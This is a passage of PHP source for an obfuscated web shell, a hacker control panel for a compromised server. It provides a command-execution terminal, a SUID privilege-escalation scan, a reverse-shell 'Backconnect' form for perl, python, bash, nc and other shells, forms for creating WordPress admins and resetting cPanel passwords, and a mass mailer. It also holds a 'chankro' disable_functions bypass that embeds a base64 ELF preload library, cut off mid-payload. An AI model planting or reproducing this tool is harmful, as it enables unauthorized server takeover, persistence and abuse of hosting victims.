                                <div class="progress-bar progress-cpu" style="width: <?= $sysInfo['cpu_load'] !== 'N/A' ? round($sysInfo['cpu_load'], 2) . '%' : 'N/A' ?>"></div>
                            </div>
                            <div class="text-xs text-gray-400 flex justify-between">
                                <span>0%</span>
                                <span class="text-blue-400 cyber-font">
                                <?= $sysInfo['cpu_load'] !== 'N/A' ? round($sysInfo['cpu_load'], 2) . '%' : 'N/A' ?>
                            </span>
                            </div>
                        </div>
                        
                        <!-- Memory Card -->
                        <div class="info-card rounded-lg p-4 cyber-panel">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center">
                                    <i class="fas fa-memory text-green-400 mr-2 cyber-glow-success"></i>
                                    <span class="font-medium cyber-font">MEMORY</span>
                                </div>
                                <span class="text-green-400 cyber-font"><?= formatMemory($sysInfo['mem_total']) ?></span>
                            </div>
                            <div class="progress-container mb-2">
                                <div class="progress-bar progress-mem" style="width: <?= $memUsagePercent ?>%"></div>
                            </div>
                            <div class="text-xs text-gray-400 flex justify-between">
                                <span>0%</span>
                                <span class="text-green-400 cyber-font">
                                <?= $memUsagePercent > 0 ? round($memUsagePercent, 2) . '%' : 'N/A' ?>
                            </span>
                            </div>
                        </div>
                            
                        <!-- Disk Card -->
                        <div class="info-card rounded-lg p-4 cyber-panel">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center">
                                    <i class="fas fa-hdd text-yellow-400 mr-2 cyber-glow-warning"></i>
                                    <span class="font-medium cyber-font">DISK</span>
                                </div>
                                <span class="text-yellow-400 cyber-font"><?= $sysInfo['disk_total'] !== 'N/A' ? formatMemory($sysInfo['disk_total']) : 'N/A' ?></span>
                            </div>
                            <div class="progress-container mb-2">
                                <div class="progress-bar progress-disk" style="width: <?= $diskUsagePercent ?>%"></div>
                            </div>
                            <div class="text-xs text-gray-400 flex justify-between">
                                <span>0%</span>
                                <span class="text-green-400 cyber-font">
                                <?= $diskUsagePercent > 0 ? round($diskUsagePercent, 2) . '%' : 'N/A' ?>
                            </span>
                            </div>
                        </div>
                            
                        <!-- Uptime Card -->
                        <div class="info-card rounded-lg p-4 cyber-panel">
                            <div class="flex items-center justify-between">
                                <div class="flex items-center">
                                    <i class="fas fa-clock text-purple-400 mr-2 cyber-glow"></i>
                                    <span class="font-medium cyber-font">UPTIME</span>
                                </div>
                                <span class="text-purple-400 cyber-font"><?= formatUptime($sysInfo['uptime']) ?></span>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Server Info -->
                    <div class="glass-effect cyber-panel rounded-lg p-4 mb-6 cyber-border">
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-5">
                            <div class="flex items-center">
                                <i class="fas fa-server text-blue-400 mr-2 cyber-glow"></i>
                                <div>
                                    <div class="text-xs text-gray-400 cyber-font">HOSTNAME</div>
                                    <div class="text-sm"><?= $fungsi[8](); ?></div>
                                </div>
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-globe text-green-400 mr-2 cyber-glow-success"></i>
                                <div>
                                    <div class="text-xs text-gray-400 cyber-font">SOFTWARE</div>
                                    <div class="text-sm"><?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></div>
                                </div>
                                
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-network-wired text-purple-400 mr-2 cyber-glow"></i>
                                <div>
                                    <div class="text-xs text-gray-400 cyber-font">IP ADDRESS</div>
                                    <div class="text-sm"><?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?></div>
                                </div>
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-user text-yellow-400 mr-2 cyber-glow-warning"></i>
                                <div>
                                    <div class="text-xs text-gray-400 cyber-font">USER</div>
                                    <div class="text-sm"><?= $fungsi[9](); ?></div>
                                </div>
                            </div>
                            <div class="flex items-center">
                                <i class="fab fa-php text-indigo-400 mr-2 cyber-glow"></i>
                                <div>
                                    <div class="text-xs text-gray-400 cyber-font">PHP VERSION</div>
                                    <div class="text-sm"><?= PHP_VERSION; ?></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="path-breadcrumb glass-effect rounded-lg p-3 mb-4 flex items-center flex-wrap cyber-border">
                        <?php
                        $cwd = str_replace("\\", "/", $get_cwd);
                        $pwd = explode("/", $cwd);
                        if (stristr(PHP_OS, "WIN")) {
                            windowsDriver();
                        }
                        foreach ($pwd as $id => $val) {
                            if ($val == '' && $id == 0) {
                                echo '<a href="?d=' . hx('/') . '" class="flex items-center text-blue-400 hover:text-blue-300 mr-2 cyber-font">
                                        <i class="fas fa-home mr-1"></i> /
                                      </a>';
                                continue;
                            }
                            if ($val == '') continue;
                            echo '<span class="text-gray-400 mr-2 cyber-font">/</span>';
                            echo '<a href="?d=';
                            for ($i = 0; $i <= $id; $i++) {
                                echo hx($pwd[$i]);
                                if ($i != $id) echo hx("/");
                            }
                            echo '" class="text-green-400 hover:text-green-300 mr-2 cyber-font">' . $val . '</a>';
                        }
                        ?>
                        <a href='?d=<?= hx(__DIR__) ?>' class="ml-auto bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                            <i class="fas fa-home mr-1"></i> Home
                        </a>
                    </div>
                    
                    <div class="glass-effect rounded-lg overflow-hidden cyber-border">
                        <div class="hidden md:grid grid-cols-12 bg-slate-800 p-3 font-medium cyber-font">
                            <div class="col-span-6 flex items-center">
                                <input type="checkbox" id="select-all" class="mr-3">
                                <span>NAME</span>
                            </div>
                            <div class="col-span-2 text-center">SIZE</div>
                            <div class="col-span-2 text-center">PERMISSIONS</div>
                            <div class="col-span-2 text-center">ACTIONS</div>
                        </div>

                        <form action="" method="post">
                            <div class="max-h-[60vh] overflow-y-auto">
                                <?php foreach ($file_manager as $_D) : ?>
                                    <?php if ($fungsi[2]($_D)) : ?>
                                        <div class="file-item grid grid-cols-1 md:grid-cols-12 p-3 border-b border-slate-700 hover:bg-slate-800/50 gap-2">
                                            <div class="col-span-6 flex items-start md:items-center">
                                                <input type="checkbox" name="check[]" value="<?= $_D ?>" class="mr-3 mt-1 md:mt-0">
                                                <div class="text-yellow-400 mr-2"><i class="fas fa-folder"></i></div>
                                                <div class="flex flex-col">
                                                    <a href="?d=<?= hx($fungsi[0]() . '/' . $_D); ?>" class="text-blue-300 hover:text-blue-200 truncate">
                                                        <?= namaPanjang($_D); ?>
                                                    </a>
                                                    <div class="md:hidden text-sm text-gray-400 flex flex-wrap gap-3 mt-1">
                                                        <span class="text-orange-300">[DIR]</span>
                                                        <span class="text-green-400"><?= perms($fungsi[0]() . '/' . $_D); ?></span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="hidden md:flex col-span-2 justify-center items-center text-orange-300 text-sm">
                                                [DIR]
                                            </div>

                                            <div class="hidden md:flex col-span-2 justify-center items-center text-green-400 text-sm">
                                                <?= perms($fungsi[0]() . '/' . $_D); ?>
                                            </div>

                                            <div class="col-span-2 flex justify-center items-center space-x-2">
                                                <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="text-blue-400 hover:text-blue-300" title="Rename">
                                                    <i class="fas fa-pen-to-square"></i>
                                                </a>
                                                
                                                <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="text-yellow-400 hover:text-yellow-300" title="Chmod">
                                                    <i class="fas fa-user-lock"></i>
                                                </a>
                                            </div>
                                        </div>
                                    <?php endif; ?>
                                <?php endforeach; ?>

                                <?php foreach ($file_manager as $_F) : ?>
                                    <?php if ($fungsi[3]($_F)) : ?>
                                        <div class="file-item grid grid-cols-1 md:grid-cols-12 p-3 border-b border-slate-700 hover:bg-slate-800/50 gap-2">
                                            <div class="col-span-6 flex items-start md:items-center">
                                                <input type="checkbox" name="check[]" value="<?= $_F ?>" class="mr-3 mt-1 md:mt-0">
                                                <div class="mr-2"><?= file_ext($_F) ?></div>
                                                    <div class="flex flex-col">
                                                        <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="text-green-300 hover:text-green-200 truncate">
                                                            <?= namaPanjang($_F); ?>
                                                        </a>
                                                        <div class="md:hidden text-sm text-gray-400 flex flex-wrap gap-3 mt-1">
                                                            <span class="text-orange-300"><?= formatSize(filesize($_F)); ?></span>
                                                            <span class="<?= is_writable($fungsi[0]() . '/' . $_F) ? 'text-green-400' : 'text-red-400' ?>">
                                                                <?= perms($fungsi[0]() . '/' . $_F); ?>
                                                            </span>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="hidden md:flex col-span-2 justify-center items-center text-orange-300 text-sm">
                                                    <?= formatSize(filesize($_F)); ?>
                                                </div>

                                                <div class="hidden md:flex col-span-2 justify-center items-center text-sm <?= is_writable($fungsi[0]() . '/' . $_F) ? 'text-green-400' : 'text-red-400' ?>">
                                                    <?= perms($fungsi[0]() . '/' . $_F); ?>
                                                </div>

                                                <div class="md:flex col-span-2 flex justify-center items-center space-x-2">
                                                    <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="text-blue-400 hover:text-blue-300" title="Rename">
                                                        <i class="fas fa-pen-to-square"></i>
                                                    </a>
                                                    <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="text-yellow-400 hover:text-yellow-300" title="Chmod">
                                                        <i class="fas fa-user-lock"></i>
                                                    </a>
                                                    <a href="?action=delete&item=<?= hx($_F) ?>" class="text-red-400 hover:text-red-300" title="Delete">
                                                        <i class="fas fa-trash"></i>
                                                    </a>
                                                    <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="text-green-400 hover:text-green-300" title="Download">
                                                        <i class="fas fa-download"></i>
                                                    </a>
                                                </div>
                                            </div>
                                        <?php endif; ?>
                                    <?php endforeach; ?>
                                </div>

                                <div class="bg-slate-800 p-3 flex flex-wrap gap-3">
                                    <select name="haxorsec-select" class="bg-slate-700 text-white rounded px-3 py-1 text-sm flex-1 md:flex-none cyber-font">
                                        <option value="delete">Delete</option>
                                        <option value="unzip">Unzip</option>
                                        <option value="zip">Zip</option>
                                    </select>
                                    <button type="submit" name="submit-action" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-1 rounded text-sm flex items-center flex-1 md:flex-none justify-center cyber-btn">
                                        <i class="fas fa-play mr-1"></i> Execute
                                    </button>
                                </div>
                            </form>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <?php if (isset($_GET['cpanelreset'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: Cpanel Reset</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <input type="email" name="resetcp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Your email : example@mail.com">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-orange-600 hover:bg-orange-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['createwp'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold text-center">CREATE WORDPRESS ADMIN PASSWORD</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <input type="text" name="db_name" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_NAME">
                    <input type="text" name="db_user" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_USER">
                    <input type="text" name="db_password" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_PASSWORD">
                    <input type="text" name="db_host" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_HOST" value="127.0.0.1">
                    <hr class="border-slate-600 my-3">
                    <input type="text" name="wp_user" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Your Username">
                    <input type="text" name="wp_pass" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Your Password">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submitwp" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: Backconnect</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <select name="haxorsec-bc" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3">
                        <option value="-">Choose Backconnect</option>
                        <option value="perl">Perl</option>
                        <option value="python">Python</option>
                        <option value="ruby">Ruby</option>
                        <option value="bash">Bash</option>
                        <option value="php">php</option>
                        <option value="nc">nc</option>
                        <option value="sh">sh</option>
                        <option value="xterm">Xterm</option>
                        <option value="golang">Golang</option>
                    </select>
                    <input type="text" name="backconnect-host" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="127.0.0.1">
                    <input type="number" name="backconnect-port" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="1337">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit-bc" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: PHP Mailer</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <textarea name="message-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3 h-24" placeholder="Your Text here!"></textarea>
                    <input type="text" name="mailto-subject" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Subject">
                    <input type="email" name="mail-from-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="from : example@mail.com">
                    <input type="email" name="mail-to-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="to : example@mail.com">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-pink-600 hover:bg-pink-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['f']) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-6xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-code icon-blue mr-2"></i> Code Editor : <?= unx($_GET['f']); ?>
                    </h3>
                    <button id="close-editor-btn" class="text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post" class="flex-1 flex flex-col">
                    <textarea name="code-editor" id="code" class="flex-1"><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                    <div class="flex justify-end p-4 border-t border-slate-700 space-x-2">
                        <button type="submit" name="save-editor" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Save</button>
                        <button id="close-editor-btn" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php if (isset($_POST['terminal'])) { echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));} ?>
                </textarea>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="terminal-text" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="terminal" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['scan'] == "suid") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php echo $fungsi[10](cmd("find / -user root -perm /4000 2>/dev/null")); ?>
                </textarea>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "chankro") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <div class="terminal-output flex-1 overflow-auto p-4">
                <?php
                    if (isset($_POST['terminal-chankro'])) {
                        $p = "p"."u"."t"."e"."n"."v";
                        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
                        $m = "m"."a"."i"."l";
                        $base = "ba"."se"."64"."_"."de"."co"."de";
                        $en = "ba"."se"."64"."_"."en"."co"."de";
                        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
                        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
                        $drnm = "d"."i"."r"."n"."a"."m"."e";
                        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
                        $currentFilePath = $_SERVER['PHP_SELF'];
                        $doc = $_SERVER['DOCUMENT_ROOT'];
                        $directoryPath = dirname($currentFilePath);
                        $full = $doc . $directoryPath;
                        $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                        $host = $_SERVER['HTTP_HOST'];
                        $script_path = $_SERVER['SCRIPT_NAME'];
                        $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                        $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                        if(isset($_POST['exechankro'])){
                            $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAA